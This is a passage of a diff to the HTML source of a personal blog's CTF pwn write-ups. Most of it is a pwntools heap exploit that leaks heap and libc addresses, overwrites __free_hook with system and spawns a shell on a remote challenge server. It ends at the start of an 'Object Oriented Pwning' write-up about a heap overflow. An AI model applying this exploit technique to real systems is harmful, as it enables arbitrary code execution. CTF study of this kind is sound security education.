+</span></span><span style=display:flex><span>context<span style=color:#666>.</span>log_level <span style=color:#666>=</span> <span style=color:#4070a0>&#39;debug&#39;</span>
+</span></span><span style=display:flex><span>context<span style=color:#666>.</span>terminal <span style=color:#666>=</span> [<span style=color:#4070a0>&#34;tmux&#34;</span>, <span style=color:#4070a0>&#34;splitw&#34;</span>, <span style=color:#4070a0>&#34;-h&#34;</span>]
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>#sh = process(&#34;./unintended&#34;)
-</span></span><span style=display:flex><span>sh = remote(&#34;193.57.159.27&#34;, &#34;59314&#34;)
-</span></span><span style=display:flex><span>libc = ELF(&#34;./libc.so.6&#34;)
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#sh = process(&#34;./unintended&#34;)</span>
+</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;193.57.159.27&#34;</span>, <span style=color:#4070a0>&#34;59314&#34;</span>)
+</span></span><span style=display:flex><span>libc <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./libc.so.6&#34;</span>)
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>def makeChallenge(number, category, name, desc_size, desc, points):
-</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;&gt; &#34;, &#39;1&#39;)
-</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;number: &#34;, str(number))
-</span></span><span style=display:flex><span>    sh.sendafter(&#34;category: &#34;, category)
-</span></span><span style=display:flex><span>    sh.sendafter(&#34;name: &#34;, name)
-</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;length: &#34;, str(desc_size))
-</span></span><span style=display:flex><span>    sh.sendafter(&#34;description: &#34;, desc)
-</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;Points: &#34;, str(points))
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>makeChallenge</span>(number, category, name, desc_size, desc, points):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt; &#34;</span>, <span style=color:#4070a0>&#39;1&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;number: &#34;</span>, <span style=color:#007020>str</span>(number))
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;category: &#34;</span>, category)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;name: &#34;</span>, name)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;length: &#34;</span>, <span style=color:#007020>str</span>(desc_size))
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;description: &#34;</span>, desc)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Points: &#34;</span>, <span style=color:#007020>str</span>(points))
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>def patchChallenge(number, desc):
-</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;&gt; &#34;, &#39;2&#39;)
-</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;number: &#34;, str(number))
-</span></span><span style=display:flex><span>    sh.sendafter(&#34;description: &#34;, desc)
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>patchChallenge</span>(number, desc):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt; &#34;</span>, <span style=color:#4070a0>&#39;2&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;number: &#34;</span>, <span style=color:#007020>str</span>(number))
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;description: &#34;</span>, desc)
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>def deployChallenge(number):
-</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;&gt; &#34;, &#39;3&#39;)
-</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;number: &#34;, str(number))
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>deployChallenge</span>(number):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt; &#34;</span>, <span style=color:#4070a0>&#39;3&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;number: &#34;</span>, <span style=color:#007020>str</span>(number))
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>def takeDownChallenge(number):
-</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;&gt; &#34;, &#39;4&#39;)
-</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;number: &#34;, str(number))
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>takeDownChallenge</span>(number):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt; &#34;</span>, <span style=color:#4070a0>&#39;4&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;number: &#34;</span>, <span style=color:#007020>str</span>(number))
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>makeChallenge(0, &#39;web&#39;, &#39;idx:0&#39;, 0x800, &#39;idx:0&#39;, 100)
-</span></span><span style=display:flex><span>makeChallenge(1, &#39;web&#39;, &#39;idx:1&#39;, 0x100, &#39;idx:1&#39;, 100)
-</span></span><span style=display:flex><span>makeChallenge(2, &#39;web&#39;, &#39;idx:2&#39;, 0x100, &#39;idx:2&#39;, 100)
-</span></span><span style=display:flex><span>takeDownChallenge(0) # 22
-</span></span><span style=display:flex><span>takeDownChallenge(1) # 19
-</span></span><span style=display:flex><span>takeDownChallenge(2) # 16
+</span></span><span style=display:flex><span>makeChallenge(<span style=color:#40a070>0</span>, <span style=color:#4070a0>&#39;web&#39;</span>, <span style=color:#4070a0>&#39;idx:0&#39;</span>, <span style=color:#40a070>0x800</span>, <span style=color:#4070a0>&#39;idx:0&#39;</span>, <span style=color:#40a070>100</span>)
+</span></span><span style=display:flex><span>makeChallenge(<span style=color:#40a070>1</span>, <span style=color:#4070a0>&#39;web&#39;</span>, <span style=color:#4070a0>&#39;idx:1&#39;</span>, <span style=color:#40a070>0x100</span>, <span style=color:#4070a0>&#39;idx:1&#39;</span>, <span style=color:#40a070>100</span>)
+</span></span><span style=display:flex><span>makeChallenge(<span style=color:#40a070>2</span>, <span style=color:#4070a0>&#39;web&#39;</span>, <span style=color:#4070a0>&#39;idx:2&#39;</span>, <span style=color:#40a070>0x100</span>, <span style=color:#4070a0>&#39;idx:2&#39;</span>, <span style=color:#40a070>100</span>)
+</span></span><span style=display:flex><span>takeDownChallenge(<span style=color:#40a070>0</span>) <span style=color:#60a0b0;font-style:italic># 22</span>
+</span></span><span style=display:flex><span>takeDownChallenge(<span style=color:#40a070>1</span>) <span style=color:#60a0b0;font-style:italic># 19</span>
+</span></span><span style=display:flex><span>takeDownChallenge(<span style=color:#40a070>2</span>) <span style=color:#60a0b0;font-style:italic># 16</span>
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>makeChallenge(0, &#39;web&#39;, &#39;idx:0&#39;, 0x208, &#39;a&#39;.ljust(0x208, &#39;a&#39;), 100)
-</span></span><span style=display:flex><span>makeChallenge(1, &#39;web&#39;, &#39;idx:1&#39;, 0x5E0, &#39;aaaaaaaa&#39;, 100)
-</span></span><span style=display:flex><span>makeChallenge(2, &#39;web&#39;, &#39;idx:2&#39;, 0x100, &#39;a&#39;, 100)
+</span></span><span style=display:flex><span>makeChallenge(<span style=color:#40a070>0</span>, <span style=color:#4070a0>&#39;web&#39;</span>, <span style=color:#4070a0>&#39;idx:0&#39;</span>, <span style=color:#40a070>0x208</span>, <span style=color:#4070a0>&#39;a&#39;</span><span style=color:#666>.</span>ljust(<span style=color:#40a070>0x208</span>, <span style=color:#4070a0>&#39;a&#39;</span>), <span style=color:#40a070>100</span>)
+</span></span><span style=display:flex><span>makeChallenge(<span style=color:#40a070>1</span>, <span style=color:#4070a0>&#39;web&#39;</span>, <span style=color:#4070a0>&#39;idx:1&#39;</span>, <span style=color:#40a070>0x5E0</span>, <span style=color:#4070a0>&#39;aaaaaaaa&#39;</span>, <span style=color:#40a070>100</span>)
+</span></span><span style=display:flex><span>makeChallenge(<span style=color:#40a070>2</span>, <span style=color:#4070a0>&#39;web&#39;</span>, <span style=color:#4070a0>&#39;idx:2&#39;</span>, <span style=color:#40a070>0x100</span>, <span style=color:#4070a0>&#39;a&#39;</span>, <span style=color:#40a070>100</span>)
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>deployChallenge(2)
-</span></span><span style=display:flex><span>sh.recvuntil(&#34;Description: &#34;)
-</span></span><span style=display:flex><span>heap_base = u64(sh.recv(6).ljust(8, &#39;\x00&#39;)) - 0xa61
-</span></span><span style=display:flex><span>log.success(&#34;heap_base: &#34; + hex(heap_base))
+</span></span><span style=display:flex><span>deployChallenge(<span style=color:#40a070>2</span>)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;Description: &#34;</span>)
+</span></span><span style=display:flex><span>heap_base <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>6</span>)<span style=color:#666>.</span>ljust(<span style=color:#40a070>8</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)) <span style=color:#666>-</span> <span style=color:#40a070>0xa61</span>
+</span></span><span style=display:flex><span><span style=color:#007020>log</span><span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;heap_base: &#34;</span> <span style=color:#666>+</span> hex(heap_base))
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>deployChallenge(1)
-</span></span><span style=display:flex><span>sh.recvuntil(&#34;a&#34; * 8)
-</span></span><span style=display:flex><span>libc_base = u64(sh.recv(6).ljust(8, &#39;\x00&#39;)) - libc.sym[&#34;__malloc_hook&#34;] - 0xF0 - 0x470 + 0x80
-</span></span><span style=display:flex><span>__free_hook = libc_base + libc.sym[&#34;__free_hook&#34;]
-</span></span><span style=display:flex><span>system = libc_base + libc.sym[&#34;system&#34;]
-</span></span><span style=display:flex><span>log.success(&#34;libc_base: &#34; + hex(libc_base)) 
+</span></span><span style=display:flex><span>deployChallenge(<span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;a&#34;</span> <span style=color:#666>*</span> <span style=color:#40a070>8</span>)
+</span></span><span style=display:flex><span>libc_base <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>6</span>)<span style=color:#666>.</span>ljust(<span style=color:#40a070>8</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)) <span style=color:#666>-</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;__malloc_hook&#34;</span>] <span style=color:#666>-</span> <span style=color:#40a070>0xF0</span> <span style=color:#666>-</span> <span style=color:#40a070>0x470</span> <span style=color:#666>+</span> <span style=color:#40a070>0x80</span>
+</span></span><span style=display:flex><span>__free_hook <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;__free_hook&#34;</span>]
+</span></span><span style=display:flex><span>system <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;system&#34;</span>]
+</span></span><span style=display:flex><span><span style=color:#007020>log</span><span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;libc_base: &#34;</span> <span style=color:#666>+</span> hex(libc_base)) 
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>payload = p64(0) + p64(0x21)
-</span></span><span style=display:flex><span>payload += p64(heap_base + 0x290 + 0x10) * 2
-</span></span><span style=display:flex><span>payload += (p64(0x20) + p64(0x21)) * 10
+</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x21</span>)
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(heap_base <span style=color:#666>+</span> <span style=color:#40a070>0x290</span> <span style=color:#666>+</span> <span style=color:#40a070>0x10</span>) <span style=color:#666>*</span> <span style=color:#40a070>2</span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> (p64(<span style=color:#40a070>0x20</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x21</span>)) <span style=color:#666>*</span> <span style=color:#40a070>10</span>
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>patchChallenge(0, payload.ljust(0x200, &#39;a&#39;) + p64(0x200) + &#39;\x00&#39;) # 11
-</span></span><span style=display:flex><span>takeDownChallenge(1) # 8
+</span></span><span style=display:flex><span>patchChallenge(<span style=color:#40a070>0</span>, payload<span style=color:#666>.</span>ljust(<span style=color:#40a070>0x200</span>, <span style=color:#4070a0>&#39;a&#39;</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x200</span>) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 11</span>
+</span></span><span style=display:flex><span>takeDownChallenge(<span style=color:#40a070>1</span>) <span style=color:#60a0b0;font-style:italic># 8</span>
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>makeChallenge(3, &#39;web&#39;, &#39;idx:3&#39;, 0x80, &#39;a&#39;, 100)
-</span></span><span style=display:flex><span>takeDownChallenge(3) # 5
-</span></span><span style=display:flex><span>takeDownChallenge(0) # 2
+</span></span><span style=display:flex><span>makeChallenge(<span style=color:#40a070>3</span>, <span style=color:#4070a0>&#39;web&#39;</span>, <span style=color:#4070a0>&#39;idx:3&#39;</span>, <span style=color:#40a070>0x80</span>, <span style=color:#4070a0>&#39;a&#39;</span>, <span style=color:#40a070>100</span>)
+</span></span><span style=display:flex><span>takeDownChallenge(<span style=color:#40a070>3</span>) <span style=color:#60a0b0;font-style:italic># 5</span>
+</span></span><span style=display:flex><span>takeDownChallenge(<span style=color:#40a070>0</span>) <span style=color:#60a0b0;font-style:italic># 2</span>
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>makeChallenge(0, &#39;web&#39;, &#39;idx:0&#39;, 0x200, p64(0) + p64(0x91) + p64(__free_hook), 100)
-</span></span><span style=display:flex><span>makeChallenge(6, &#39;web&#39;, &#39;/bin/sh\x00&#39;, 0x80, &#39;/bin/sh\x00&#39;, 100)
-</span></span><span style=display:flex><span>makeChallenge(7, &#39;web&#39;, &#39;/bin/sh\x00&#39;, 0x80, p64(system), 100)
-</span></span><span style=display:flex><span>takeDownChallenge(6)
-</span></span><span style=display:flex><span>#gdb.attach(proc.pidof(sh)[0])
+</span></span><span style=display:flex><span>makeChallenge(<span style=color:#40a070>0</span>, <span style=color:#4070a0>&#39;web&#39;</span>, <span style=color:#4070a0>&#39;idx:0&#39;</span>, <span style=color:#40a070>0x200</span>, p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x91</span>) <span style=color:#666>+</span> p64(__free_hook), <span style=color:#40a070>100</span>)
+</span></span><span style=display:flex><span>makeChallenge(<span style=color:#40a070>6</span>, <span style=color:#4070a0>&#39;web&#39;</span>, <span style=color:#4070a0>&#39;/bin/sh</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>0x80</span>, <span style=color:#4070a0>&#39;/bin/sh</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>100</span>)
+</span></span><span style=display:flex><span>makeChallenge(<span style=color:#40a070>7</span>, <span style=color:#4070a0>&#39;web&#39;</span>, <span style=color:#4070a0>&#39;/bin/sh</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>, <span style=color:#40a070>0x80</span>, p64(system), <span style=color:#40a070>100</span>)
+</span></span><span style=display:flex><span>takeDownChallenge(<span style=color:#40a070>6</span>)
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#gdb.attach(proc.pidof(sh)[0])</span>
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>sh.interactive()
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
 </span></span></code></pre></div><h3 id=object-oriented-pwning>Object Oriented Pwning</h3><p>SetName 函数中存在堆溢出</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#902000>void</span> Animal<span style=color:#666>::</span>SetName() {
 </span></span><span style=display:flex><span>    printf(<span style=color:#4070a0>&#34;What will you name your new animal? &#34;</span>);
 </span></span><span style=display:flex><span>    flush();
@@ -650,4 +648,4 @@ write 可以读出低四个字节</p><p>由于是 libc 2.31，所以 double free
 <a class=border></a><a class=soc href=https://twitter.com/chujdk rel=me title=Twitter><i data-feather=twitter></i></a>
 <a class=border></a><a class=soc href=mailto:chujj31@gmail.com rel=me title=Mail><i data-feather=mail></i></a>
 <a class=border></a><a class=soc href=https://www.cjovi.icu/index.xml rel=me title=Rss><i data-feather=rss></i></a>
-<a class=border></a></div><div class=footer-info>&nbsp2020 ~ 2023  © chuj |  Based on <a href=https://github.com/athul/archie>Archie</a> | Built with <a href=https://gohugo.io>Hugo</a> | <a href=#>Goto Top</a></div></footer><script>feather.replace()</script></div></body></html>
+<a class=border></a></div><div class=footer-info>&nbsp2020 ~ 2024  © chuj |  Based on <a href=https://github.com/athul/archie>Archie</a> | Built with <a href=https://gohugo.io>Hugo</a> | <a href=#>Goto Top</a></div></footer><script>feather.replace()</script></div></body></html>
